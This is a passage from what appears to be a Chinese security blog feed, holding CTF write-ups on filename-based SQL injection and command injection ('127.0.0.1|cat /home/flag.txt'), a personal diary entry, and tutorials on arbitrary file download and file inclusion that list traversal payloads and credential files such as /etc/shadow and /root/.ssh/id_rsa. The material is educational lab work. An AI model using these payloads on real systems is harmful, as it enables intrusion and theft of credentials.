src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511171808488.png" alt="image-20220511171808488"></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>尝试将查询结果改为16进制输出</p><p>构造payload ：</p><pre class="line-numbers language-none"><code class="language-none">1&#39;+(selselectect hex(database()))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511173040394.png" alt="image-20220511173040394"></p><p>将数据库名字转换16进制+1输出得到7765626（7765625+1），将这个数字16进制解码得到web</p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511173441841.png" alt="image-20220511173441841"></p><p>这里有个坑,  插入数据库文件名中如果包括SQL语句，在返回信息时，服务器将对字母进行截断（某些特殊字符也会截断或过滤） 尝试用10进制表示 conv函数(src,from_base,to_base) src是要转换的数据, from_base是原进制, to_base是目标进制.</p><p><strong>使用CONV是因为题目过滤了回显有字母的情况，如果出现了字母则后面的内容就不显示，所以需要将16进制的内容转成10进制。</strong></p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">&#39;+(selselectect conv(hex(database()),16,10))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511174116852.png" alt="image-20220511174116852"></p><p>返回结果使用了科学计数法，这里就需要截断数据了。</p><p> 构造payload：</p><pre class="line-numbers language-none"><code class="language-none">&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+ &#39;.jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(经过测试发现长度最大为12,超过12 就会返回科学计数法表示)</p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511174408587.png" alt="image-20220511174408587"></p><p>有返回值：<code>131277325825392</code></p><p>尝试截取13试试：<br><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511174500681.png" alt="image-20220511174500681"></p><p>可以看到返回的还是科学计数法，验证最大为12。</p><p>将十进制<code>131277325825392</code>转换为16进制<code>7765625f7570</code>，16进制解码得到部分数据库名：</p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511175058980.png" alt="image-20220511175058980"></p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511175215303.png" alt="image-20220511175215303"></p><p>由此可以得出7765626并不是完整的16进制编码的数据库名，在返回信息时，服务器应该是对其进行了截断。</p><p>由于上述返回的是科学计数法，对其进行了截断处理，所以再将后面的结果将其查出：</p><p>构造payload：（从13开始）</p><pre class="line-numbers language-none"><code class="language-none">&#39;+(selselectect conv(substr(hex(database()),13,12),16,10))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511175910444.png" alt="image-20220511175910444"></p><p>得到<code>1819238756</code>，解码得到：<code>---&gt;6c6f6164---&gt;load</code></p><p>最后将其拼接得到完整的数据名：<code>web_upload</code></p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p><strong>查表：</strong></p><pre class="line-numbers language-none"><code class="language-none">&#39;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema&#x3D;&#39;web_upload&#39; limit 1,1)),1,12),16,10))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511180721439.png" alt="image-20220511180721439"></p><p>返回：<code>114784820031327</code>—&gt;<code>68656c6c6f5f（16）</code>—&gt;<code>hello_</code></p><pre class="line-numbers language-none"><code class="language-none">&#39;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema&#x3D;&#39;web_upload&#39; limit 1,1)),13,12),16,10))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回：<code>112615676665705</code>—&gt;<code>666c61675f69（16）</code>—&gt;<code>flag_i</code></p><pre class="line-numbers language-none"><code class="language-none">&#39;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema&#x3D;&#39;web_upload&#39; limit 1,1)),25,12),16,10))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回：<code>126853610566245</code>—&gt;<code>735f68657265（16）</code>—&gt;<code>s_here</code></p><p>表名拼接为：<code>hello_flag_is_here</code></p><p>##0x08</p><p><strong>查字段：</strong></p><pre class="line-numbers language-none"><code class="language-none">&#39;+(seleselectct+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name&#x3D;&#39;hello_flag_is_here&#39; limit 0,1)),1,12),16,10))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511182706415.png" alt="image-20220511182706415"></p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511182715960.png" alt="image-20220511182715960"></p><p>返回：<code>115858377367398</code>—&gt;<code>695f616d5f66（16）</code>—&gt;<code>i_am_f</code></p><pre class="line-numbers language-none"><code class="language-none">&#39;+(seleselectct+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name&#x3D;&#39;hello_flag_is_here&#39; limit 0,1)),13,12),16,10))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回：<code>7102823</code>—&gt;<code>6c6167（16）</code>—&gt;<code>lag</code></p><p>字段拼接为：<code>i_am_flag</code></p><p>##0x09</p><p><strong>查内容：</strong></p><pre class="line-numbers language-none"><code class="language-none">&#39;+(seleselectct+conv(substr(hex(selselectect i_am_flag frfromom hello_flag_is_here limit 0,1),1,12),16,10))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511183508159.png" alt="image-20220511183508159"></p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511183522209.png" alt="image-20220511183522209"></p><p>返回：<code>36427215695199</code>—&gt;<code>21215f406d5f（16）</code>—&gt;<code>!!_@m_</code></p><pre class="line-numbers language-none"><code class="language-none">&#39;+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回：<code>92806431727430</code>—&gt;<code>54682e655f46（16）</code>—&gt;<code>Th.e_F</code></p><pre class="line-numbers language-none"><code class="language-none">&#39;+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回：<code>560750951</code>—&gt;<code>216c6167（16）</code>—&gt;<code>!lag</code></p><p>拼接flag为：<code>!!_@m_Th.e_F!lag</code></p><p>参考文章：</p><p><a href="https://blog.csdn.net/qq_44065556/article/details/120449847">https://blog.csdn.net/qq_44065556/article/details/120449847</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104724247">https://blog.csdn.net/mochu7777777/article/details/104724247</a></p><h2 id="0x10（总结）"><a href="#0x10（总结）" class="headerlink" title="0x10（总结）"></a>0x10（总结）</h2><p>这个题拿到以后首先肯定认为是文件上传的题目，但由于上传文件不会返回文件路径，这是和一般上传题目不同的地方；其次，每次上传之后返回的是文件名，这不由的会想到sql注入的特征：报错回显，正确返回内容。这里最主要就是要想到：<strong>因为回显的只是文件名，然后它存入数据库的也可能是文件名，既然连接了数据库就可能存在注入漏洞。然后就能想到可能是文件名sql注入。任何与数据库发生连接交互的地方都可能存在SQL注入！有文件名回显,这说明文件已经被传到了数据库中,浏览器又从数据库中读取了上传的文件,那么这个过程就有可能触发sql注入。</strong></p><p>题中还有一个是：使用<code>conv函数</code>是因为题目过滤了回显有字母的情况，如果出现了字母则后面的内容就不显示，所以需要将16进制的内容转成10进制。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-web-command_execution</title>
      <link href="/2022/05/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-command-execution/"/>
      <url>/2022/05/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-command-execution/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一道攻防世界的命令执行题目。</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p><img src="/2022/05/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-command-execution/image-20220509165059892.png" alt="image-20220509165059892"></p><p>根据提示RCE无WAF，直接打开题目。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><img src="/2022/05/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-command-execution/image-20220509165155543.png" alt="image-20220509165155543"></p><p>##0x02</p><p>老规矩，先看看是何服务器</p><p><img src="/2022/05/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-command-execution/image-20220509165532330.png" alt="image-20220509165532330"></p><p><img src="/2022/05/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-command-execution/image-20220509165712211.png" alt="image-20220509165712211"></p><p>linux服务器。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>先ping 127.0.0.1，有结果</p><p><img src="/2022/05/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-command-execution/image-20220509165833220.png" alt="image-20220509165833220"></p><p>使用linux管道符查看目录</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1|ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/05/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-command-execution/image-20220509165945268.png" alt="image-20220509165945268"></p><p>当前目录为index.php，没有发现flag文件。</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>既然没有flag.php文件，就要尝试看看有没有flag.txt文件，使用linux命令find查找文件：</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1|find &#x2F; -name &#39;*.txt&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到有flag.txt文件。</p><p><img src="/2022/05/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-command-execution/image-20220509170052497.png" alt="image-20220509170052497"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>打开flag.txt文件</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1|cat &#x2F;home&#x2F;flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/05/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-command-execution/image-20220509170357121.png" alt="image-20220509170357121"></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>这个题主要是注意当前目录中没有相关的<code>php</code>文件要想到<code>txt</code>文件。</p><p><strong>所涉及知识点：</strong></p><p><code>Linux find</code> 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 <code>find</code> 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示</p>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于她</title>
      <link href="/2022/04/24/%E5%85%B3%E4%BA%8E%E5%A5%B9/"/>
      <url>/2022/04/24/%E5%85%B3%E4%BA%8E%E5%A5%B9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="写一篇关于她"><a href="#写一篇关于她" class="headerlink" title="写一篇关于她"></a>写一篇关于她</h2><p>时隔久远没更博了，种种原因实在没时间。</p><p>​        想写一篇关于她，之前就想写了，一直不知道该怎么写，直到今天，我昨晚又梦到她了。虽然经常会梦到她，但这次也许感情更加浓烈。关于她，也就随便聊聊，自己想把自己心里压了很久的话写在这里。关于她，我只想用一句网络流行语来形容：我喜欢别人怀里的女孩，就是她。</p><p>​       关于她，应该追溯到我上初中时期的事情了。她，我情窦初开第一个喜欢的女孩，那时的我便每天迷恋着她，当时还和她坐着同桌，那时候的我就开始追求人家，虽然没有表现的很明显，也是因为有很多顾虑，她在班里学习成绩一直名列前茅，一直害怕耽误她的学习；但我当时并不比她差，也正是如此，后来我的成绩严重下滑，最后把自己搞得很狼狈，我当时的发小了解情况之后很生气就来质问我：”她就这么吸引你吗？看看你自己变成什么样子了，她长得很倾国倾城吗？“后来我告诉我发小，她吸引我的地方并不是她的外貌，虽然她并不是很漂亮，但她最吸引我的地方是她身上的气质，她身上的魅力，网红不比她更漂亮吗？但对我来说网红什么都不是。后来有一段时间，我发现我已经控制不住自己了，开始变得颓废，不再是以前那个我了，开始随心所欲，再也没有在乎过成绩的好坏。果然，不出所料，中考那年，她去了全市最好的高中，而我只能末流学校；上了高中，我以为我已经放下了，毕竟嘛，一个女人而已，有什么大不了的，当时就开始物色高中的女孩决定要开始另一段感情了。在这里我想对自己说一句：你就是个废物垃圾。如果演电影时候都不需要你怎么去模仿演废物，你直接本色出演。和高中的一个简简单单谈了半年，一开始还很正常，可到了第三个月，我发现我和现在这个女孩在一起的时候心里总会去想她，以至于对当时那个女孩再也没有了一点感觉，从那时开始，夜里做梦总会梦到她，她就像是有魔力一样，总是把控着我的内心，我那时才发现，初中喜欢了她两年，那两年时间真正的把她放在了心底，无论是谁也撼动不了的地位。我发现我还是那么喜欢她，偶尔想起来她心里还是会笑，我总会骂自己你可真贱啊。上了高中以后我再也没有联系过她，只有她的联系方式，每天都会习惯性的去翻翻她的朋友圈，看看她的动态给她点点赞，就这么看着，从不说一句话。我的微信喜欢删除那些从来不说话的人，或者一些只是认识而已的人，包括很多初中时的一些同学大部分都被我删了，我也忘了为什么把他们删了，或许是忘了改变备注，又或许是别的原因。但是她，我从来没想过，就算把我列表里所有人都删了我也不会删了她。不管时间过了多久，我发现我对她的喜欢从来都没有变过，尽管现在大学了，她的变化倒是出乎我的意料，以前我认识的她是不抽烟的，后来我发现她开始抽烟了，不过这些都不重要，同样改变不了我对她的喜欢，我总觉得我对她有别样得情愫。我认识她的时候是她最纯粹的时候，那才是真正的她，尽管后来她变了，但她内心最纯粹的自己我相信永远都不会变，变得只是别人看达到的她。我还记得当时QQ有一个功能是匿名留言，可以把最最想说的话匿名发给她，我当时脑子一热给她发了一句：如果以后你未嫁，我未婚，我一定会娶你。哈哈哈，想想当时的自己多幼稚。自从上了高中，我把就把QQ注销了，我的QQ私密空间里存了很多她当时照片，现在都没了。我记得初中时候有一个假期，我把她的照片做成了小视频，还写了对她表白的话，当时已经晚上2点多了，我做完之后困得睁不开眼，想着做完之后存为私密状态，谁知第二天打开一看，全部可见，当时评论都疯了，尴尬的我想抠出个三室一厅来，我立马就是删除。之后我更是不敢和她说话，不敢去看她，我也知道正是中考关键时期，我也不敢去打扰她。后来也就没有后来了。现在的我有时候还会想，我以后还可以再遇到她吗，会以什么样的方式遇见她，我遇见她的时候她会带着她的男朋友吗。或许，没有以后了。以后我也不知道我还会不会像喜欢你一样去喜欢另一个不是你的女孩，但我知道，不管是谁都替代不了你。</p><p>​        我这辈子最大的遗憾，就是当时没有和她好好说一句：我喜欢你!</p><p>​        关于她，我有很多很多说不出的心酸苦楚，无奈悲痛。我会一直把你心里，直到我真的不想再去想你的那一天。</p>]]></content>
      
      
      <categories>
          
          <category> 她 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 她 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件操作-文件下载及读取</title>
      <link href="/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E8%AF%BB%E5%8F%96/"/>
      <url>/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>脑图：<br><img src="/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E8%AF%BB%E5%8F%96/image-20220320205322924.png" alt="image-20220320205322924"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>文件下载（一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。）</p><p>任意文件下载漏洞，正常的利用手段是下载服务器文件，如脚本代码，服务器配置或者是系统配置等等。但是有的时候我们可能根本不知道网站所处的环境，以及网站的路径，这时候我们只能利用.&#x2F; ..&#x2F;来逐层猜测路径，让漏洞利用变得繁琐。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(如..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。<br>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 </p><p><strong>如下代码一个正常的网站，存在一个下载文件的功能，同时还会从浏览器接收文件名字，将存在任意文件下载漏洞。</strong></p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php  $filename &#x3D; $_GET[&#39;filename&#39;];  echo &#39;&lt;h1&gt;讲开始下载文件！&lt;&#x2F;h1&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&#39;;  echo **file_get_contents**($filename); &#x2F;&#x2F;**无过滤导致*****\*漏洞函数\**** **file_get_contents 函数把整个文件读入一个字符串中并输出**  header(&#39;Content-Type: imgage&#x2F;jpeg&#39;);  header(&#39;Content-Disposition: attachment; filename&#x3D;&#39;.$filename);  header(&#39;Content-Lengh: &#39;.filesize($filename));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>如何发现（网站URL中存在下载参数，并且未进行过滤..&#x2F;..&#x2F;..&#x2F;字符，且输出了文件内容）<br>1、Google search<br>利用inurl:”readfile.php?file&#x3D;”</p><p>2、从链接上看，形如：<br>  • download.php?path&#x3D;<br>  • download.php?file&#x3D;<br>  • down.php?file&#x3D;<br>  • data.php?file&#x3D;<br>  • readfile.php?file&#x3D;<br>  • read.php?filename&#x3D;</p><p>3、从参数名看，形如：<br>  • &amp;RealPath&#x3D;<br>  • &amp;FilePath&#x3D;<br>  • &amp;ﬁlepath&#x3D;<br>  • &amp;Filepath&#x3D;<br>  • &amp;Path&#x3D;<br>  • &amp;path&#x3D;<br>  • &amp;inputFile&#x3D;<br>  • &amp;Inputfile&#x3D;<br>  • &amp;url&#x3D;<br>  • &amp;urls&#x3D;<br>  • &amp;Lang&#x3D;<br>  • &amp;dis&#x3D;<br>  • &amp;data&#x3D;<br>  • &amp;Data&#x3D;<br>  • &amp;readﬁle&#x3D;<br>  • &amp;ﬁlep&#x3D;<br>  • &amp;src&#x3D;<br>  • &amp;menu&#x3D;<br>  • META-INF<br>  • WEB-INF</p><p>4、index.php?f&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p><p> index.php?f&#x3D;..&#x2F;index.php</p><p> index.php?f&#x3D;ﬁle:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p><p> readfile.php?file&#x3D;&#x2F;etc&#x2F;passwd</p><p> readfile.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p><p> readfile.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00（00截断）</p><p>5、使用扫描工具扫描敏感文件，如：</p><p>​      御剑，7kb等等</p><p>6、利用下载好的文件代码去分析路径和包含文件获取敏感文件等</p><p>7、真实网站需要找到下载功能点，分析是什么脚本及下载路径选择对应下载文件</p><p>（<strong>注：当参数f的参数值为php文件时，若是文件被解析则是文件包含漏洞，</strong></p><p>  <strong>若显示源码或提示下载则是文件查看与下载漏洞</strong>）</p><h2 id="漏洞绕过"><a href="#漏洞绕过" class="headerlink" title="漏洞绕过"></a>漏洞绕过</h2><p>1.若过滤字符或字母可尝试编码绕过</p><p>2.利用 ..&#x2F;..&#x2F;</p><p>但是有些代码会进行过滤(具体要根据代码进行测试)，会把 ..&#x2F; 置空<br>利用….&#x2F;&#x2F; 代替 ..&#x2F;<br>利用..&#x2F;&#x2F; 代替 &#x2F;</p><p>具体怎么绕过还是得看代码是怎么写的<br>3.</p><p>注意<br>①.注意 <strong>..&#x2F;</strong> 的数量，他代表查询目录父目录的数量<br>②.当我们遇到一个任意文件下载漏洞时首先要注意下载的权限问题。因为权限决定我们能下载的文件范围。<br>③.有些网站（主要是针对系统）并不会在URL里显示给你看，这时候你需要抓包，从数据包里修改路径，达到任意文件读取。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>**利用:**（信息收集信息&gt;猜路径 &gt;&gt;下载配置文件&#x2F;代码文件 &gt;&gt; 利用服务器软件漏洞&gt; shell&gt; 提权）<br>1.任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</p><p>2.下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置<br>下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。<br>下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器</p><p>3.Windows：（windows的这些路径不一定都存在）</p><p>  C:\boot.ini &#x2F;&#x2F;查看系统版本</p><p>  C:\Windows\System32\inetsrv\MetaBase.xml     &#x2F;&#x2F;IIS配置文件</p><p>  C:\Windows\repair\sam                     &#x2F;&#x2F;存储系统初次安装的密码</p><p>  C:\Program Files\mysql\my.ini                &#x2F;&#x2F;Mysql配置</p><p>  C:\Program Files\mysql\data\mysql\user.MYD   &#x2F;&#x2F;Mysql root</p><p>  C:\Windows\php.ini        &#x2F;&#x2F;php配置信息</p><p>  C:\Windows\my.ini        &#x2F;&#x2F;Mysql配置信息</p><p>  C:\Windows\win.ini        &#x2F;&#x2F;Windows系统的一个基本系统配置文件</p><p>Linux：</p><p>  &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p><p>  &#x2F;root&#x2F;.ssh&#x2F;id_rsa</p><p>  &#x2F;root&#x2F;.ssh&#x2F;id_ras.keystore</p><p>  &#x2F;root&#x2F;.ssh&#x2F;known_hosts        &#x2F;&#x2F;记录每个访问计算机用户的公钥</p><p>  &#x2F;etc&#x2F;passwd</p><p>  &#x2F;etc&#x2F;shadow</p><p>  &#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini         &#x2F;&#x2F;PHP配置文件</p><p>  &#x2F;etc&#x2F;my.cnf          &#x2F;&#x2F;mysql配置文件</p><p>  &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf        &#x2F;&#x2F;apache配置文件</p><p>  &#x2F;root&#x2F;.bash_history        &#x2F;&#x2F;用户历史命令记录文件</p><p>  &#x2F;root&#x2F;.mysql_history        &#x2F;&#x2F;mysql历史命令记录文件</p><p>  &#x2F;proc&#x2F;mounts          &#x2F;&#x2F;记录系统挂载设备</p><p>  &#x2F;porc&#x2F;config.gz         &#x2F;&#x2F;内核配置文件</p><p>  &#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db      &#x2F;&#x2F;全文件路径</p><p>  &#x2F;porc&#x2F;self&#x2F;cmdline        &#x2F;&#x2F;当前进程的cmdline参数</p><h2 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><ul><li>过滤<code>.</code>(点)，使用户在url中不能回溯上级目录</li><li>正则严格判断用户输入参数的格式</li><li><code>php.ini</code>配置<code>open_basedir</code>限定文件访问范围</li></ul><p>转载原文：<br><a href="https://www.cnblogs.com/zzhoo/p/12613815.html">https://www.cnblogs.com/zzhoo/p/12613815.html</a></p><p><strong>Javaweb实现文件下载：</strong></p><p><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p><p><strong>小米路由器远程任意文件下载：</strong><br><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></p>]]></content>
      
      
      <categories>
          
          <category> 任意文件下载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 任意文件下载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件操作-文件包含漏洞</title>
      <link href="/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>脑图：<br><img src="/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220320180915280.png" alt="image-20220320180915280"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页面需要更新时，只更新一个包含文件就可以了，或者向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><h2 id="文件包含涉及函数"><a href="#文件包含涉及函数" class="headerlink" title="文件包含涉及函数"></a>文件包含涉及函数</h2><pre class="line-numbers language-none"><code class="language-none">require()函数：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本include()函数：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行include_once()函数：若文件中代码已被包含则不会再次包含require_once()函数：若文件中代码已被包含则不会再次包含<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><p>例：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token 